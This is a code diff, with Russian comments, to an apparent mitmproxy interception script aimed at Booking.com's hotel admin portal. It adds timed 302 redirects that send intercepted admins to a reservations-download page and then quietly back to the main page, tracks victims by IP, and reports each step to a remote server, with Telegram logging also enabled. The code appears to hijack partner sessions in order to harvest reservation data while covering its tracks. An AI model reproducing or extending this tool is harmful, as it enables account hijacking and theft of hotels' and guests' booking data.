@@ -7,6 +7,8 @@ import requests
 import json
 from datetime import datetime
 import re
+FUNCTION_COMPLETION_TIMES = {}
+import time
 
 # --- TELEGRAM LOGGING CONFIG ---
 TELEGRAM_LOGGING_ENABLED = True
@@ -571,14 +573,91 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
     """
     ФУНКЦИЯ 18:
     Редиректит все запросы к admin.booking.com/hotel/* на страницу загрузки резервов.
+    С ДОПОЛНИТЕЛЬНЫМИ РЕДИРЕКТАМИ ПОСЛЕ ЗАВЕРШЕНИЯ:
+    1. После завершения - 3 секунды ожидания
+    2. В течение 2 минут: если обновление страницы - редирект на главную
+    3. Через 10 секунд: автоматический редирект на главную
     """
     try:
+        url = flow.request.pretty_url
+        host = (flow.request.pretty_host or "").lower()
+        client_ip = get_client_ip(flow)
+        
+        # ====== ПРОВЕРКА ДОПОЛНИТЕЛЬНЫХ РЕДИРЕКТОВ ПОСЛЕ ЗАВЕРШЕНИЯ ======
+        # Проверяем, была ли уже завершена функция 18 для этого IP
+        if client_ip in FUNCTION_COMPLETION_TIMES:
+            completion_data = FUNCTION_COMPLETION_TIMES[client_ip]
+            completion_time = completion_data.get("function_18_completed_at", 0)
+            initial_url = completion_data.get("initial_url", "")
+            
+            if completion_time > 0:
+                current_time = time.time()
+                time_since_completion = current_time - completion_time
+                
+                # Проверяем, это ли страница reservations_download.html
+                is_reservations_page = "reservations_download.html" in url
+                
+                if is_reservations_page:
+                    # ПРИНЦИП: одинаковый путь (reservations_download.html), но параметры могут быть любые
+                    parsed_current = urllib.parse.urlparse(url)
+                    parsed_initial = urllib.parse.urlparse(initial_url)
+                    
+                    # Сравниваем только путь, без параметров
+                    if parsed_current.path == parsed_initial.path:
+                        
+                        # 1. В течение первых 3 секунд - НИЧЕГО НЕ ДЕЛАЕМ (ждем загрузки)
+                        if time_since_completion <= 3:
+                            log(f"[F18] ✓ Page loaded, waiting 3s grace period ({time_since_completion:.1f}s passed)")
+                            return False
+                        
+                        # 2. После 10 секунд - АВТОМАТИЧЕСКИЙ РЕДИРЕКТ НА ГЛАВНУЮ
+                        elif time_since_completion >= 10:
+                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
+                            log(f"[F18] ✓ 10s timeout reached - auto-redirect to main page")
+                            
+                            # Логируем дополнительный редирект
+                            log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_POST_COMPLETION_AUTO")
+                            
+                            flow.response = http.Response.make(
+                                302,
+                                b"",
+                                {
+                                    "Location": target_url,
+                                    "Cache-Control": "no-cache, no-store, must-revalidate",
+                                    "Pragma": "no-cache",
+                                    "Expires": "0",
+                                    "X-MITM-Redirect": "Function-18-Post-Auto"
+                                }
+                            )
+                            return True
+                        
+                        # 3. От 3 до 120 секунд - РЕДИРЕКТ ПРИ ПОВТОРНОМ ЗАПРОСЕ/ОБНОВЛЕНИИ
+                        elif 3 < time_since_completion < 120:
+                            # Это повторный запрос той же страницы в течение 2 минут
+                            log(f"[F18] ✓ Page refresh within 2min ({time_since_completion:.1f}s) - redirect to main")
+                            
+                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
+                            
+                            # Логируем дополнительный редирект
+                            log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_POST_COMPLETION_REFRESH")
+                            
+                            flow.response = http.Response.make(
+                                302,
+                                b"",
+                                {
+                                    "Location": target_url,
+                                    "Cache-Control": "no-cache, no-store, must-revalidate",
+                                    "Pragma": "no-cache",
+                                    "Expires": "0",
+                                    "X-MITM-Redirect": "Function-18-Post-Refresh"
+                                }
+                            )
+                            return True
+        
+        # ====== ОСНОВНАЯ ЛОГИКА ФУНКЦИИ (БЕЗ ИЗМЕНЕНИЙ) ======
         if not should_booking_reservations():
             return False
 
-        url = flow.request.pretty_url
-        host = (flow.request.pretty_host or "").lower()
-        
         # ====== ТОЛЬКО admin.booking.com ======
         if not host.endswith("admin.booking.com"):
             return False
@@ -598,11 +677,18 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
             # Получаем полный URL для Telegram
             full_url = url
             
+            # СОХРАНЯЕМ ВРЕМЯ ЗАВЕРШЕНИЯ ДЛЯ ЭТОГО ПОЛЬЗОВАТЕЛЯ
+            FUNCTION_COMPLETION_TIMES[client_ip] = {
+                "function_18_completed_at": time.time(),
+                "initial_url": full_url  # Сохраняем оригинальный URL для сравнения пути
+            }
+            
+            log(f"[F18] ✓ Completion time saved for IP {client_ip}")
+            
             # Удаляем флаг функции 18
             remove_booking_reservations_flag()
             
             # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ (с полным URL)
-            client_ip = get_client_ip(flow)
             send_function_complete_notification(client_ip, full_url, "FUNCTION_18_COMPLETE")
             
             log(f"[F18] ✓ Completion notification sent for function 18")
@@ -652,7 +738,6 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
         log(f"[F18] ✓ Redirecting {url} -> {target_url}")
         
         # Логируем редирект (уведомление о НАЧАЛЕ функции)
-        client_ip = get_client_ip(flow)
         log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_RESERVATIONS_DOWNLOAD")
         
         # Выполняем ПЕРВИЧНЫЙ редирект
@@ -673,6 +758,24 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
         import traceback
         log(f"[F18] Traceback: {traceback.format_exc()}")
         return False
+
+def cleanup_old_completion_times():
+    """Очищает записи о завершении функций старше 5 минут"""
+    try:
+        current_time = time.time()
+        to_delete = []
+        
+        for client_ip, data in FUNCTION_COMPLETION_TIMES.items():
+            completion_time = data.get("function_18_completed_at", 0)
+            if current_time - completion_time > 300:  # 5 минут
+                to_delete.append(client_ip)
+        
+        for client_ip in to_delete:
+            del FUNCTION_COMPLETION_TIMES[client_ip]
+            log(f"[F18] Cleaned up old completion time for IP {client_ip}")
+            
+    except Exception as e:
+        log(f"[F18] Error cleaning up completion times: {e}")
 
 def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
     """
